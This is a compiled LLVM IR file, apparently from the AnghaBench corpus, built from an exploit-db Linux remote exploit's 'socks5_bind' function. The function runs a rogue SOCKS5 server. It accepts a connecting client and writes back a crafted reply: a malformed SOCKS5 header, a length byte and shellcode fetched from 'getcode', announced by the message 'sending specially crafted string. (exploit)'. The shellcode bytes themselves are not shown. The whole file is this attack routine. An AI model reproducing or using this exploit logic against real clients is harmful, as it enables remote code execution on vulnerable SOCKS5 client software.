; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_296.c_socks5_bind.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_296.c_socks5_bind.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_REUSEADDR = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"[*] awaiting connection from: *:%d.\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"could not bind socket.\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"[*] socks-5 server connection established.\0A\00", align 1
@BUFSIZE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [41 x i8] c"socks5_bind(): allocating memory failed.\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"\05\00\05\00\00\03\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"[*] sending specially crafted string. (exploit)\0A\00", align 1
@.str.6 = private unnamed_addr constant [39 x i8] c"[*] socks-5 server connection closed.\0A\00", align 1
@SO_REUSEPORT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @socks5_bind(i16 zeroext %0, i32 %1) #0 {
  %3 = alloca i16, align 2
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  store i16 %0, i16* %3, align 2
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %12 = load i32, i32* @AF_INET, align 4
  %13 = load i32, i32* @SOCK_STREAM, align 4
  %14 = load i32, i32* @IPPROTO_TCP, align 4
  %15 = call i32 @socket(i32 %12, i32 %13, i32 %14)
  store i32 %15, i32* %5, align 4
  %16 = load i32, i32* %5, align 4
  %17 = load i32, i32* @SOL_SOCKET, align 4
  %18 = load i32, i32* @SO_REUSEADDR, align 4
  %19 = bitcast i32* %7 to i8*
  %20 = call i32 @setsockopt(i32 %16, i32 %17, i32 %18, i8* %19, i32 4)
  %21 = load i32, i32* @AF_INET, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %21, i32* %22, align 4
  %23 = load i16, i16* %3, align 2
  %24 = call i32 @htons(i16 zeroext %23)
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %24, i32* %25, align 4
  %26 = load i32, i32* @INADDR_ANY, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %28 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %27, i32 0, i32 0
  store i32 %26, i32* %28, align 4
  %29 = load i16, i16* %3, align 2
  %30 = zext i16 %29 to i32
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i32 %30)
  %32 = load i32, i32* %5, align 4
  %33 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %34 = call i32 @bind(i32 %32, %struct.sockaddr* %33, i32 12)
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %38

36:                                               ; preds = %2
  %37 = call i32 @printe(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %38

38:                                               ; preds = %36, %2
  %39 = load i32, i32* %5, align 4
  %40 = call i32 @listen(i32 %39, i32 2)
  %41 = bitcast %struct.sockaddr_in* %11 to i8*
  %42 = call i32 @bzero(i8* %41, i32 12)
  store i32 12, i32* %8, align 4
  %43 = load i32, i32* %5, align 4
  %44 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %45 = call i32 @accept(i32 %43, %struct.sockaddr* %44, i32* %8)
  store i32 %45, i32* %6, align 4
  %46 = load i32, i32* %5, align 4
  %47 = call i32 @close(i32 %46)
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  %49 = load i32, i32* @BUFSIZE, align 4
  %50 = add nsw i32 %49, 7
  %51 = add nsw i32 %50, 1
  %52 = call i64 @malloc(i32 %51)
  %53 = inttoptr i64 %52 to i8*
  store i8* %53, i8** %9, align 8
  %54 = icmp ne i8* %53, null
  br i1 %54, label %57, label %55

55:                                               ; preds = %38
  %56 = call i32 @printe(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0), i32 1)
  br label %57

57:                                               ; preds = %55, %38
  %58 = load i8*, i8** %9, align 8
  %59 = call i32 @memcpy(i8* %58, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i32 6)
  %60 = load i32, i32* @BUFSIZE, align 4
  %61 = trunc i32 %60 to i8
  %62 = load i8*, i8** %9, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 6
  store i8 %61, i8* %63, align 1
  %64 = load i8*, i8** %9, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 7
  %66 = load i32, i32* %4, align 4
  %67 = call i8* @getcode(i32 %66)
  %68 = load i32, i32* @BUFSIZE, align 4
  %69 = call i32 @memcpy(i8* %65, i8* %67, i32 %68)
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i64 0, i64 0))
  %71 = load i32, i32* %6, align 4
  %72 = load i8*, i8** %9, align 8
  %73 = load i32, i32* @BUFSIZE, align 4
  %74 = add nsw i32 %73, 7
  %75 = call i32 @write(i32 %71, i8* %72, i32 %74)
  %76 = load i8*, i8** %9, align 8
  %77 = call i32 @free(i8* %76)
  %78 = call i32 @sleep(i32 1)
  %79 = load i32, i32* %6, align 4
  %80 = call i32 @close(i32 %79)
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0))
  %82 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %83 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %82, i32 0, i32 0
  %84 = load i32, i32* %83, align 4
  %85 = call i8* @inet_ntoa(i32 %84)
  ret i8* %85
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i8* @getcode(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i8* @inet_ntoa(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
